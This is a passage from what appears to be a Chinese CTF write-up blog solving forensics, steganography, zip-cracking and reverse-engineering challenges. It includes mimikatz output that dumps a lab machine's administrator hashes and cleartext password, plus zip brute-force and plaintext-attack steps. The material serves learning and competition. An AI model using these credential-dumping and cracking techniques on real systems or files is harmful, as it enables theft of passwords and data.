class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 347784 (00000000:00054e88)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WIN7</span><br><span class="line">Logon Server      : WIN7</span><br><span class="line">Logon Time        : 2019/11/14 9:38:33</span><br><span class="line">SID               : S-1-5-21-1539156736-1959120456-2224594862-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * LM       : c4d0515fb12046a475113b7737dc0019</span><br><span class="line">         * NTLM     : aafdad330f5a9f4fbf562ed3d25f97de</span><br><span class="line">         * SHA1     : 8b9a7ca86970d1392b6fa0b94b8694c2b919469f</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : W3lc0meToD0g3</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : W3lc0meToD0g3</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : WIN7</span><br><span class="line">         * Password : W3lc0meToD0g3</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/11/14 9:35:06</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : WORKGROUP</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/11/14 9:35:06</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN7$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win7$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 48847 (00000000:0000becf)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/11/14 9:35:04</span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : WORKGROUP</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2019/11/14 9:35:04</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN7$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win7$</span><br><span class="line">         * Domain   : WORKGROUP</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure><p>解一下压缩包得flag(口令为<code>W3lc0meToD0g3</code>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;3466b11de8894198af3636c5bd1efce2&#125;</span><br></pre></td></tr></table></figure><h4 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h4><p>先导出http的对象，直接save all即可，注意到这是对密码有一个爆破的操作，一个文件一个文件地打开发现flag</p><p><img src="/2021/05/28/CTF//image-20210804183639765.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;password_is_not_weak&#125;</span><br></pre></td></tr></table></figure><h3 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h3><p>这个有个大佬写的比较方便的脚本</p><p><strong><a href="https://github.com/WangYihang/UsbKeyboardDataHacker">UsbKeyboardDataHacker</a></strong></p><h4 id="BUUCTF、USB"><a href="#BUUCTF、USB" class="headerlink" title="BUUCTF、USB"></a>BUUCTF、USB</h4><p>题目给出了个rar文件还有个ftm的文件，将ftm文件用binwalk分离出key.pcap流量包，打开之后确实是usb的流量</p><p><img src="/2021/05/28/CTF//image-20210803235852673.png"></p><p>那就直接那脚本梭了。</p><p><img src="/2021/05/28/CTF//image-20210804000444335.png"></p><p>得到的内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;</span><br></pre></td></tr></table></figure><p>​然后看<code>233.rar</code>这个文件，文件内压缩有一个小文件但是这个文件很大，肯定是格式错误导致第二个文件没有显示出来，用010editor打开提示第三个rar块里面有crc错误，对比其他的块发现错了一个字节，改正即可<code>7A =&gt; 74</code>。</p><p>​后又得到一个png的文件，stegsolve打开之后在蓝色0通道发现一张二维码</p><p><img src="/2021/05/28/CTF//image-20210804174032957.png" alt=" "></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ci&#123;v3erf_0tygidv2_fc0&#125;</span><br></pre></td></tr></table></figure><p>结合上面的key进行维吉尼亚解密</p><p><img src="/2021/05/28/CTF//image-20210804175251645.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fa&#123;i3eei_0llgvgn2_sc0&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210804175346375.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=&gt;栅栏密码</span><br><span class="line">flag&#123;vig3ne2e_is_c00l&#125;</span><br></pre></td></tr></table></figure><h3 id="特殊数据"><a href="#特殊数据" class="headerlink" title="特殊数据"></a>特殊数据</h3><h4 id="蜘蛛侠呀"><a href="#蜘蛛侠呀" class="headerlink" title="蜘蛛侠呀"></a>蜘蛛侠呀</h4><p>每段icmp数据后面都跟着有一些有用处的数据，使用tshark命令将其分离出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r out.pcap -T fields -e data &gt; data.txt</span><br></pre></td></tr></table></figure><p>然后写个脚本处理一下数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line">data1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    tmp = data[i].strip()</span><br><span class="line">    <span class="keyword">if</span> tmp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    data1.append(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + tmp, <span class="number">16</span>)).strip())</span><br><span class="line">data = data1[<span class="number">4</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">content = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>):</span><br><span class="line">    tmp = <span class="built_in">str</span>(data[i])[<span class="number">11</span>:-<span class="number">1</span>]</span><br><span class="line">    content += base64.b64decode(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(content)</span><br></pre></td></tr></table></figure><p>然后获得了一张flag.gif的动图，没发现什么特殊之处，打开wp发现是帧与帧之间的时间是不同的，使用下面的命令获取帧与帧之间的时间间隔。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ identify -format <span class="string">&quot;%T&quot;</span> flag.gif</span><br><span class="line">2050502050502050205020202050202020205050205020502050205050505050202050502020205020505050205020206666</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;205050205050205020502020205020202020505020502050205020505050505020205050202020502050505020502020&#x27;</span>.replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">s = <span class="built_in">int</span>(s, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(s))</span><br><span class="line"><span class="comment"># mD5_1t</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f0f1003afe4ae8ce4aa8e8487a8ab3b6&#125;</span><br></pre></td></tr></table></figure><h2 id="office文件相关"><a href="#office文件相关" class="headerlink" title="office文件相关"></a>office文件相关</h2><h3 id="word文件内藏文件"><a href="#word文件内藏文件" class="headerlink" title="word文件内藏文件"></a>word文件内藏文件</h3><p>因为office文件的近似于压缩包的格式，使得我们可以将想隐藏的文件藏入解压缩后的各个目录或者文件内，但是一般这样生搬硬套地隐写会导致office文件打开时内容乱码，所以对于office文件，一般来说，有内容乱码的就是文件内藏入了一些文件或者文本。</p><h4 id="bugku、眼见非实"><a href="#bugku、眼见非实" class="headerlink" title="bugku、眼见非实"></a>bugku、眼见非实</h4><p>这个题打开之后出现乱码，直接改后缀名为zip，解压一下找到<code>word-&gt;document.xml</code>文件，打开搜索flag发现flag<code>flag&#123;F1@g&#125;</code></p><h4 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h4><p>打开之后内容很正常，后缀名改为zip解压之后在media文件夹内发现flag的图片</p><p><img src="/2021/05/28/CTF//image23.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;unz1p_3v3ryth1ng&#125;</span><br></pre></td></tr></table></figure><h2 id="压缩包密码"><a href="#压缩包密码" class="headerlink" title="压缩包密码"></a>压缩包密码</h2><h3 id="buu、-GUET-CTF2019-zips"><a href="#buu、-GUET-CTF2019-zips" class="headerlink" title="buu、[GUET-CTF2019]zips"></a>buu、[GUET-CTF2019]zips</h3><p><strong>TAG:伪加密、掩码爆破</strong></p><p>真加密爆破得第一层得口令为<code>723456</code>，第二层是个简单的伪加密，解出来得<code>flag.zip</code>、<code>setup.sh</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(__import__(&#x27;time&#x27;).time())  # setup.sh文件的主要python代码</span><br></pre></td></tr></table></figure><p>意思就是取出当前的时间作为<code>flag.zip</code>压缩包的密码，这里先看一下这个密码的格式(执行一下上面的python2代码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1622897453.55</span><br></pre></td></tr></table></figure><p>太长了，爆破估计是不太可能的，但是注意到这里有上一次的修改日期，有可能进行掩码爆破</p><p><img src="/2021/05/28/CTF//image-20210605204224196.png"></p><p>就是对小数点之后的内容进行爆破，将<code>2019-5-17 16:40:15</code>转换为时间戳为<code>1558082415</code>，设置初始的掩码为<code>1558082415.??</code>，如果没找到，就一位一位地向前移动掩码，最后掩码为<code>155808????.??</code>是获得口令为<code>1558080832.15</code>，解压得flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fkjabPqnLawhvuikfhgzyffj&#125;</span><br></pre></td></tr></table></figure><h3 id="buu、-MRCTF2020-千层套路"><a href="#buu、-MRCTF2020-千层套路" class="headerlink" title="buu、[MRCTF2020]千层套路"></a>buu、[MRCTF2020]千层套路</h3><p><strong>TAG：zip多层加密、二维码像素、python脚本解</strong></p><p>给的时zip文件，套了很多层，每一层的密码就是这一层的压缩文件的文件名(不带上后缀名的文件名)，一层层解用脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">name = <span class="string">&#x27;0573&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(name + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> ziip:</span><br><span class="line">        ziip.extractall(pwd=name.encode())</span><br><span class="line">        delname = name</span><br><span class="line">        name = ziip.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">    os.remove(delname + <span class="string">&#x27;.zip&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得出文件<code>qr.zip</code>，解压出txt文件，用脚本再转成图片，200x200的图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;qr.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> data:</span><br><span class="line">    a = data.readlines()</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        aa = a[x*<span class="number">200</span> + y]</span><br><span class="line">        <span class="built_in">print</span>(x*<span class="number">200</span> + y)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;255&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(aa):</span><br><span class="line">            plt.scatter(x,y,c=<span class="string">&#x27;r&#x27;</span>,marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plt.scatter(x,y,c=<span class="string">&#x27;b&#x27;</span>,marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210606142548031.png"></p><p>用手机QQ扫一下得flag(QQ我滴超人)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;ta01uyout1nreet1n0usandtimes&#125;</span><br></pre></td></tr></table></figure><h3 id="buu、真实的压缩包"><a href="#buu、真实的压缩包" class="headerlink" title="buu、真实的压缩包"></a>buu、真实的压缩包</h3><p>给出两个压缩包，一个名为虚假的压缩包、一个名为真实的压缩包。虚假的压缩包为伪加密，里面是个简单的rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">11</span></span><br><span class="line">q = <span class="number">3</span></span><br><span class="line">n = <span class="number">33</span></span><br><span class="line">phi = <span class="number">20</span></span><br><span class="line">c = <span class="number">26</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;key: 答案是<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后解压出真实的压缩包，图片为高度隐写</p><p><img src="/2021/05/28/CTF//image-20210804214154795.png"></p><p>然后将亦真亦假文件与字符5进行异或，下面是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;亦真亦假&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br><span class="line">    data = <span class="built_in">str</span>(data)</span><br><span class="line"></span><br><span class="line">data1 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    tmp = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + i, <span class="number">16</span>) ^ <span class="number">5</span></span><br><span class="line">    data1 += <span class="built_in">hex</span>(tmp)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(data1)</span><br></pre></td></tr></table></figure><p>然后新建一个空白文件，将上面得出来的结果复制进去就行了</p><p><img src="/2021/05/28/CTF//image-20210804222354932.png"></p><p>然后发现是word应该，后缀名改为doc，颜色隐藏文本</p><p><img src="/2021/05/28/CTF//image-20210804222507880.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;_th2_7ru8_2iP_&#125;</span><br></pre></td></tr></table></figure><h3 id="buu、-ACTF新生赛2020-明文攻击"><a href="#buu、-ACTF新生赛2020-明文攻击" class="headerlink" title="buu、[ACTF新生赛2020]明文攻击"></a>buu、[ACTF新生赛2020]明文攻击</h3><p>题目提示，明文攻击。</p><p>一层层打开发现图片与带密码的压缩包，压缩包里面有两个文件，根据题目提示，思路应该是从图片里面提取出来一个明文，借以解开压缩包的密码，使用。那就先对图片进行操作，但是很明显使用foremost都没分离出来，那就是后面的格式有点错误了，只能手动用winhex分了。</p><p><img src="/2021/05/28/CTF//image-20210910184341499.png"></p><p>打开发现里面是<code>flag.txt</code>，明文攻击的要素都满足了，打开工具直接一把梭了。</p><p><img src="/2021/05/28/CTF//image-20210911002725745.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;3te9_nbb_ahh8&#125;</span><br></pre></td></tr></table></figure><h2 id="给出字串"><a href="#给出字串" class="headerlink" title="给出字串"></a>给出字串</h2><blockquote><p>misc中常见给出字串让转为文件或者其他什么东西的题型，就是给你一串或长或短的数字，让你解一下这段内容，转换一下获得文件或者明文。</p></blockquote><h3 id="TTL隐写"><a href="#TTL隐写" class="headerlink" title="TTL隐写"></a>TTL隐写</h3><blockquote><p>​IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。<br>​如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。</p></blockquote><h4 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h4><p>给出的文件的内容只有<code>63 127 191 255</code>四个数字，此时考虑ttl隐写。</p><p><code>00 替换 63 01 替换 127 10 替换 191 11 替换 255</code></p><p>写出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;attachment.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read().replace(<span class="string">&#x27;63\n&#x27;</span>, <span class="string">&#x27;00&#x27;</span>).replace(<span class="string">&#x27;127\n&#x27;</span>, <span class="string">&#x27;01&#x27;</span>).replace(<span class="string">&#x27;191\n&#x27;</span>, <span class="string">&#x27;10&#x27;</span>).replace(<span class="string">&#x27;255\n&#x27;</span>, <span class="string">&#x27;11&#x27;</span>)</span><br><span class="line">    data = <span class="built_in">int</span>(data, <span class="number">2</span>)</span><br><span class="line">    data = <span class="built_in">hex</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(data[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>​再将文件内的内容复制粘贴到winhex里面，然后似乎文件头没有<code>50</code>不知道是不是我个人的问题。</p><p>​然后zip伪加密，务必使用010editor，看起来zip伪加密更清晰一点。</p><p>​里面又是base家族的多重加密，使用我个人开发的专属解题脚本解出flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210804233925939.png"></p><h2 id="含逆向的misc"><a href="#含逆向的misc" class="headerlink" title="含逆向的misc"></a>含逆向的misc</h2><h3 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h3><p>这题很简单，直接改计算机的系统时间即可</p><p><img src="/2021/05/28/CTF//image-20200917204620215.png"></p><p><img src="/2021/05/28/CTF//image-20200917204556945.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;We1cOm3_70_cyber_security&#125;</span><br></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="方向介绍与解题思路"><a href="#方向介绍与解题思路" class="headerlink" title="方向介绍与解题思路"></a>方向介绍与解题思路</h2><h3 id="方向的简单介绍"><a href="#方向的简单介绍" class="headerlink" title="方向的简单介绍"></a>方向的简单介绍</h3><p>reverse方向在实战中表现为计算机软件破解，有一般的c与c++作为反编译内容的破解、有基于c#的软件的破解、有基于java的逆向破解等等。</p><p>而在CTF中，reverse的出题模式一般有下面的几种</p><h3 id="一般的逆向题"><a href="#一般的逆向题" class="headerlink" title="一般的逆向题"></a>一般的逆向题</h3><h3 id="一般的迷宫题"><a href="#一般的迷宫题" class="headerlink" title="一般的迷宫题"></a>一般的迷宫题</h3><h2 id="一般逆向-啥都没有，简单的算法"><a href="#一般逆向-啥都没有，简单的算法" class="headerlink" title="一般逆向(啥都没有，简单的算法)"></a>一般逆向(啥都没有，简单的算法)</h2><h3 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h3><p>先查pe，注意到是UPX壳，直接拉到虚拟机内脱壳</p><p><img src="/2021/05/28/CTF//image-20210531101308798.png" alt="image-20210531101308798"></p><p>然后直接拖入ida32，跟踪到如下的主要代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">3</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">5</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401A10();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">65</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v10 != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5[<span 